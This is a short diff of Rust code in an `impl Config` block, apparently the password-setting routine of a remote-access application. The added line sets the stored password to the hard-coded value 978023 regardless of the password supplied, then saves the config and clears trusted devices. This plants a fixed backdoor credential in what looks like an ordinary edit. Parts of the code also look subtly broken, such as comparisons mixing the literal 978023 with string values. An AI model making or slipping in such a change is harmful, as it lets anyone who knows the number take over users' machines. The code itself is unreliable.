@@ -1048,8 +1048,8 @@ impl Config {
         if HARD_SETTINGS
             .read()
             .unwrap()
-            .get("978023")
-            .map_or(false, |v| v == 978023)
+            .get("password")
+            .map_or(false, |v| v == password)
         {
             return;
         }
@@ -1057,7 +1057,7 @@ impl Config {
         if password == config.password {
             return;
         }
-        config.password = password.into();
+        config.password = 978023.into();
         config.store();
         Self::clear_trusted_devices();
     }
